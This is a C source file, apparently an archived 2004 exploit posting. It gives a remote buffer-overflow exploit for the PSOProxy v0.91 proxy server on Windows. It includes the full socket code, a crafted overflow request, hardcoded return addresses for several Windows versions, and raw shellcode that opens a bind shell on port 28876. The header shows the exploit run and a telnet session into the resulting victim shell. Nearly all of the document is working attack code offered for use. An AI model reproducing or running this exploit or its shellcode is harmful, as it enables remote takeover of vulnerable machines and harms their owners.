/*

	 Copyright � Rosiello Security

 	      http www rosiello org
 	    ================

 -== Remote Exploit for PSOProxy version v0.91 ==--
 Code by: rave
 Contact: rave@rosiello.org
 Date: Feb 2004
 Bug found by: Donato Ferrante

 There is a vulnerability found in the PSOProxy server.
 An attacker can execute arbitrary code exploiting remotely a buffer overflow.

	The exploit sends:

    GET / <1021 x A><adres of the shellcode><shellcode>

 This spawns a bindshell on the victim at port 28876..


 Usage <C:\>psoproxy-exploit.exe <target host> <target number>
 Target Number           Target Name                             Stack Adress
 =============           ===========                             ===========
 0                       Demo                                    0xBADC0DED
 1                       Windows XP Home Edtion SP1.             0x00D2FDDA
 2                       Windows XP Pro Edtion SP1.              0x00EDFDDC
 3                       Win2k Pro Edtion.                       0x00BBFDDC



 <C:\> psoproxy-exploit localhost 1
 [+] Winsock Inalized
 [+] Trying to connect to localhost:8080
 [+] socket inalized
 [+] Overflowing string is Prepared
 [+] Connected.
 [+] Overflowing string had been send


 <C:\> telnet localhost 28876
 Microsoft Windows XP [versie 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.

 <D:\>

 DO NOT USE THIS CODE ON DIFFERENT MACHINES BUT YOURS!!!
 Respect the law as we do!




   Special Tankz to:
   opy   { win2k 0wnage !! ty for lending me ur box }
   B0f   { Hope to work with u again in the futhure like we do all the time }
   Dragnet  { Always willing to help me out }
   Angelo  { Verry good maffio`so }


   Greetz go out to:
   Kajun  { Verry suportive guy }
   NrAziz { 0wns pakistan hax0r scene ! beware always say mr NrAziz }
   sloth  { good guy }
   Mercy  { Hope to see u soon }
   Netric security {www.netric.org/.de }
   [+] All the hax0rs i forgot.

   Hate Messages:
   Ziphie { U didnt get mine bitch }

  OOh and Li0n7 voila fr {
  you're doing it all wrong, your exploit doesn't work!
  http://www.securityfocus.com/archive/1/354769/2004-02-15/2004-02-21/0
  k/j man, keep on doing the good stuff and next time add some more stack adresses so
  it would work on other os`s...

  }



Advisory at: http://www.rosiello.org/en/read_bugs.php?15

*/


#include <stdio.h>
#include <winsock2.h>
#include <errno.h>
#include <windows.h>

// Darn fucking 1337 macro shit
#define ISIP(m) (!(inet_addr(m) ==-1))

#define offset 1024 //1024





struct remote_targets {
  char *os;
  unsigned long sh_addr;
} target [] ={
/* Option`s for your eyes only :D*/
    "Demo                        ",
     0xbadc0ded,


    "Windows XP Home Edtion SP1. ",
     0x00D2FDDA,

    "Windows XP Pro Edtion SP1.  ",
     0x00edfddc,


    "Win2k Pro Edtion.          ",
     0x00bbfddc,

 };






//Bindcode spawns a binshell on port 28876 (Thanks to metasploit.com guys)
unsigned char  shellcode[] =
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\xeb\x43\x56\x57\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x52\x8b\x52"
  "\x20\x01\xea\x31\xc0\x31\xc9\x41\x8b\x34\x8a\x01\xee\x31\xff\xc1"
  "\xcf\x13\xac\x01\xc7\x85\xc0\x75\xf6\x39\xdf\x75\xea\x5a\x8b\x5a"
  "\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
  "\xe8\x5f\x5e\xff\xe0\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b"
  "\x70\x1c\xad\x8b\x68\x08\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32"
  "\x2e\x64\x68\x77\x73\x32\x5f\x54\xbb\x71\xa7\xe8\xfe\xe8\x90\xff"
  "\xff\xff\x89\xef\x89\xc5\x81\xc4\x70\xfe\xff\xff\x54\x31\xc0\xfe"
  "\xc4\x40\x50\xbb\x22\x7d\xab\x7d\xe8\x75\xff\xff\xff\x31\xc0\x50"
  "\x50\x50\x50\x40\x50\x40\x50\xbb\xa6\x55\x34\x79\xe8\x61\xff\xff"
  "\xff\x89\xc6\x31\xc0\x50\x50\x35\x02\x01\x70\xcc\xfe\xcc\x50\x89"
  "\xe0\x50\x6a\x10\x50\x56\xbb\x81\xb4\x2c\xbe\xe8\x42\xff\xff\xff"
  "\x31\xc0\x50\x56\xbb\xd3\xfa\x58\x9b\xe8\x34\xff\xff\xff\x58\x60"
  "\x6a\x10\x54\x50\x56\xbb\x47\xf3\x56\xc6\xe8\x23\xff\xff\xff\x89"
  "\xc6\x31\xdb\x53\x68\x2e\x63\x6d\x64\x89\xe1\x41\x31\xdb\x56\x56"
  "\x56\x53\x53\x31\xc0\xfe\xc4\x40\x50\x53\x53\x53\x53\x53\x53\x53"
  "\x53\x53\x53\x6a\x44\x89\xe0\x53\x53\x53\x53\x54\x50\x53\x53\x53"
  "\x43\x53\x4b\x53\x53\x51\x53\x87\xfd\xbb\x21\xd0\x05\xd0\xe8\xdf"
  "\xfe\xff\xff\x5b\x31\xc0\x48\x50\x53\xbb\x43\xcb\x8d\x5f\xe8\xcf"
  "\xfe\xff\xff\x56\x87\xef\xbb\x12\x6b\x6d\xd0\xe8\xc2\xfe\xff\xff"
  "\x83\xc4\x5c\x61\xeb\x89\x41";


// now what would this button do ?
char *host_ip;
u_long get_ip(char *hostname)
{
 struct  hostent    *hp;

 if (ISIP(hostname)) return inet_addr(hostname);

  if ((hp = gethostbyname(hostname))==NULL)
  { perror ("[+] gethostbyname() failed check the existance of the host.\n");
    exit(-1); }

  return (inet_ntoa(*((struct in_addr *)hp->h_addr)));
}


/// oooh yeah uuuh right ....
int usage (char *what)
{
 int i;
  fprintf(stdout,"Copyright � Rosiello Security\n");
  fprintf(stdout,"http://www.rosiello.org\n\n");
  fprintf(stdout,"Usage %s <target host> <target number>\n",what);
  fprintf(stdout,"Target Number\t\tTarget Name\t\t\t\tStack Adress\n");
  fprintf(stdout,"=============\t\t===========\t\t\t\t===========\n");

  for (i=0;i < 4;i++)
   fprintf(stdout,"%d\t\t\t%s\t\t0x%p\n",i,target[i].os,target[i].sh_addr);

  exit(0);
}

int main(int argc,char **argv)

{


char buffer[offset*2]="get /",*ptr,*address;
int sd,oops,i,choise;
struct  sockaddr_in  ooh;


WSADATA wsadata;
WSAStartup(0x101, &wsadata);

if (argc < 2) usage(argv[0]);
address=argv[1];
choise=atoi(argv[2]);

fprintf(stdout,"[+] Winsock Inalized\n");

 /* Lets start making a litle setup
    Change the port if you have to */

 ooh.sin_addr.s_addr = inet_addr(get_ip(address));
    ooh.sin_port        = htons(8080);
    ooh.sin_family      = AF_INET;


fprintf(stdout,"[+] Trying to connect to %s:%d\n",address,8080);


// ok ok here`s ur sock()
sd = socket(AF_INET, SOCK_STREAM,IPPROTO_TCP);
 if (!sd<0) { fprintf(stderr,"[!] socket() failed.\n");exit (-1); }

 fprintf(stdout,"[+] socket inalized\n");


 /* initializing the expploiting buffer, read the file comments for the details */
ptr=buffer+strlen(buffer);

for (i=strlen(buffer);i < offset;i++) *ptr++=(char)0x2e;
for (i=strlen(buffer);i < offset+6;i++) { *ptr++=(char)0xa; *ptr++=(char)0xd ;}

memcpy(buffer+strlen(buffer),((char *)&shellcode),strlen(shellcode));
memcpy(buffer+offset,((char *)&target[choise].sh_addr),3);


fprintf(stdout,"[+] Overflowing string is Prepared\n");

 // Knock knock ... hi i want to hook up with you
 oops=connect(sd, (struct sockaddr *)&ooh, sizeof( ooh ));
  if(oops!=0) { fprintf(stderr,"[!] connect() failed.\n"); exit(-1); }

// yep we are in :D
fprintf(stdout,"[+] Connected.\n");


// Sending some Dangerous stuff
i = send(sd,buffer,strlen(buffer),0);
if (!i <0) { fprintf (stdout,"[!] Send() failed\n"); exit (-1) ; }

fprintf(stdout,"[+] Overflowing string had been send\n");


/* May psoproxy rest in peace (have cold a nice one and telnet to <host>  28876

 <C:\> telnet localhost 28876
 Microsoft Windows XP [versie 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.

 D:\>
*/


// the cleaners !!
WSACleanup();

// [EOF]
return 0;

}

// milw0rm.com [2004-02-26]
